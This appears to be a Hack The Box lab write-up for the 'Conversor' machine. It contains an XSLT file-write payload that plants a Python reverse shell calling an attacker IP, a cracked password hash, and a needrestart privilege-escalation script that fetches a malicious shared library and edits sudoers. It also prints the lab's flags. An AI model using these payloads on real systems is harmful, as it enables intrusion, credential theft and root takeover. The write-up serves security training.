# Conversor

## Recon

- Nmap scan results
```
# Nmap 7.95 scan initiated Fri Jan 23 21:06:14 2026 as: /usr/lib/nmap/nmap --privileged -A -p22,80 -oN nmap_scan conversor.htb
Nmap scan report for conversor.htb (10.129.2.180)
Host is up (0.62s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
| http-title: Login
|_Requested resource was /login
|_http-server-header: Apache/2.4.52 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   680.20 ms 10.10.16.1
2   392.17 ms conversor.htb (10.129.2.180)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 23 21:06:59 2026 -- 1 IP address (1 host up) scanned in 45.68 seconds
```
- only two ports are open 22,80
- On visting the http site we can see the domain, conversor.htb add it to /etc/hosts

```
echo "10.129.3.35 conversor.htb" | sudo tee -a /etc/hosts
```
## User.txt

- We can see a login page. Register your account and login to the site 
- On visting the site we can see a site called conversor taking nmap scan results in xml format and use our choice of xslt template and transforms it into more pretty format.

- In the endpoint **/about**, found the source code of the application .
- download it and extract it to your local machine for investigation.

```
tar -xvf source_code.tar.gz
```

- The **convert()** function is vulnerable.
```
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
        xml_tree = etree.parse(xml_path, parser)
        xslt_tree = etree.parse(xslt_path)
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
        file_id = str(uuid.uuid4())
        filename = f"{file_id}.html"
        html_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(html_path, "w") as f:
            f.write(result_html)
        conn = get_db()
        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
        conn.commit()
        conn.close()
        return redirect(url_for('index'))
    except Exception as e:
        return f"Error: {e}"
```

```
from lxml import etree
```
- You can see that the code is usgin xml.etree.ElementTree which is insecure if not implemente propery . which leads to execute xml. 
- But in the above function **convert()** , the XMLparser was hardened 
```
parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
```
- We cannot execute xml but the xslt parser was still vulnerable it we can execute xslt.

- And also in the source code we dowloaded i found a files caled **install.md** .

```
If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
```
- the user www-data is runnign a cron job . from the the above scripts directory once every minute. 
- So my plan is to write a python revshell to that directory to gat a revshell.
- I am going to use the abilyt of xslt to do this.

- First we need two files xml and xslt . 
- you can use any basic xml file.(I have saved my nmap scan into xml format using -oX option, i am goinf to use that).

- I crafted a xslt paylod
```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:exploit="http://exslt.org/common"
 extension-element-prefixes="exploit"
 version="1.0">
  <xsl:template match="/">
    <exploit:document href="/var/www/conversor.htb/scripts/shell.py" method="text">
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.57",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```
- I saved it to shell.xslt and uploaded the file  to the server and started my listner .

-After one minute i got he shell . 

```
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.57] from (UNKNOWN) [10.129.3.35] 49780
$ ls
ls
conversor.htb
```

## Stabilizng the reverse shell

```
www-data@conversor:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```
- Hit enter then Crtl+Z
```
www-data@conversor:~$ ^Z
[1]  + 43757 suspended  nc -lnvp 4444
  ~/HackTheBox/Conversor ❯ stty raw -echo;fg                                                        
[1]  + 43757 continued  nc -lnvp 4444
                                     export TERM=xterm
www-data@conversor:~$ 
```
- now we got better tty terminal can use arrows clear auto complete.

## Escalate to user fismathack

- From the source code we can found a sqlite db under **/var/www/conversor.htb/instance/users.db**
- I downloaded it to my local machine you can simple do it on the box too.

```
sqlite3 users.db                                                                   2m 4s

SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> select * from users;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
sqlite> 
```
- Use crackstation or hashes.com to crack the hash

```
5b5c3ac3a1c897c94caad48e6c71fdec:Keepmesafeandwarm
```

- ssh into fismathack
```
ssh fismathack@conversor.htb
```
- In the home directory we can find the **user.txt**


**User.txt: dbb8ffcdfe89746b17317a6e55223652**

## Root Flag


```
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

- We can run **/usr/sbin/needrestart** as root without any password. 
- On googling i found that this is vulnerable to local privilage escaltion.
- Check this [github](https://github.com/pentestfunctions/CVE-2024-48990-PoC-Testing) for POC.


- I created a expoit.py

```
#!/bin/bash
set -e
cd /tmp
mkdir -p malicious/importlib
curl http://10.10.14.248:8000/__init__.so -o /tmp/malicious/importlib/__init__.so
cat << 'EOF' > /tmp/malicious/e.py
import time
import os
while True:
    try:
        import importlib
    except:
        pass
    if os.path.exists("/tmp/poc"):
        print("Got shell!")
        os.system("sudo /tmp/poc -p")
        break
    time.sleep(1)
EOF
echo "Bait process is running. Trigger 'sudo /usr/sbin/needrestart' in another shell."
cd /tmp/malicious; PYTHONPATH="$PWD" python3 e.py 2>/dev/null
```

***Note: the poc need to compile a c program but the box don't have gcc . so i compiled it in the lib.c on my machine and exported it to the box via http.***

- lib.c file

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static void a() __attribute__((constructor));

void a() {
    if(geteuid() == 0) {  // Only execute if we're running with root privileges
        setuid(0);
        setgid(0);
        const char *shell = "cp /bin/sh /tmp/poc; "
                            "chmod u+s /tmp/poc; "
                            "grep -qxF 'ALL ALL=NOPASSWD: /tmp/poc' /etc/sudoers || "
                            "echo 'ALL ALL=NOPASSWD: /tmp/poc' | tee -a /etc/sudoers > /dev/null &";
        system(shell);
    }
}
```
- Compiling lib.c 
```
gcc -shared -fPIC -o __init__.so lib.c 
```

- Now save the both files **exploit.sh** and **__init__.so** and start a web server using python
```
python3 -m http.server
```
- Download the file exploit.sh to the box 

```
wget http://IP:8000/exploit.sh

chmod +x exploit.sh

./exploit.sh
```
- This will dowload the __init__.so file from our machine and starts  the process
```
./runner.sh 
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 15520  100 15520    0     0  20074      0 --:--:-- --:--:-- --:--:-- 20077
Bait process is running. Trigger 'sudo /usr/sbin/needrestart' in another shell.
```

- On other terminal ssh to fismathack and run **sudo /usr/sbin/needrestart**

```
fismathack@conversor:/tmp$ sudo /usr/share/needrestart/
```
- Then you prompted with got shell! with root access

```
# cat root.txt	
6619ac94510ef8f219228f940b04404c
```

**Root.txt: 6619ac94510ef8f219228f940b04404c**

